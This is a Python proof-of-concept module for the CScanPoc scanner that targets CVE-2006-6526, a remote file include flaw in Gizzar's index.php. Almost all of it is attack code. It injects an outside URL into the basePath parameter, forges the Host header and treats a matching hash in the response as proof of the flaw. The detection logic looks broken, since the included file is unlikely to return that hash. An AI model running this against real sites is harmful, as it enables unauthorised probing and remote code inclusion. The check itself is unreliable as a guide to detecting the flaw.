# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Gizzar_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'Gizzar <= 03162002 (index.php) Remote File Include Vulnerability'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-12-13'  # 漏洞公布时间
    desc = '''
        Gizzar 03162002及早期版本的index.php脚本存在PHP远程文件包含漏洞，
		远程攻击者可以借助basePath参数中的URL执行任意PHP代码。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-64305'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2006-6526'  # cve编号
    product = 'Gizzar'  # 漏洞组件名称
    product_version = '03162002'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6df5b444-8635-4b52-9560-401fe51e8718'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/index.php?basePath=http://baidu.com/robots.txt'
            # 伪造的HTTP头
            httphead = {
                'Host': 'www.google.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            resp = requests.get(vul_url, headers=httphead, timeout=50)
            # md5('3.1416')=d4d7a6b8b3ed8ed86db2ef2cd728d8ec
            match = re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', resp.content)
            # 如果成功匹配到md5('3.1416'),证明漏洞验证成功
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
